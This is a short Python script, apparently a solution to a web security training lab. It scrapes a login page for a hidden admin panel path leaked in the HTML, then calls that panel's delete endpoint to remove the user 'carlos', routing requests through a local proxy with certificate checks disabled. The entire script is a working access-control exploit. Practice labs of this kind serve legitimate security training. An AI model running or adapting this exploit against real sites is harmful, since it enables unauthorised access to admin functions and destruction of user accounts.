import requests
import sys
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_admin_panel_url(url):
    uri = "/login"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    response = r.text
    session_cookie = r.cookies.get_dict()['session']
    admin_panel_url = re.search(r"/admin-\w+", response).group(0)
    return admin_panel_url,session_cookie

def delete_carlos(url, session_cookie, admin_panel_url):
    delete_func = "/delete?username=carlos"
    cookies= {'session' : session_cookie}
    r = requests.get(url + admin_panel_url + delete_func, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 200 and "User deleted successfully!" in r.text:
        return True
    return False

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    admin_panel_url,session_cookie = get_admin_panel_url(url)
    print(admin_panel_url)  ### SESSION COOKIE!
    if not delete_carlos(url, session_cookie, admin_panel_url):
        print("[-] User deletion failed!")
        sys.exit(-1)
    print("[+] User deleted successfully!")


if __name__ == "__main__":
    main()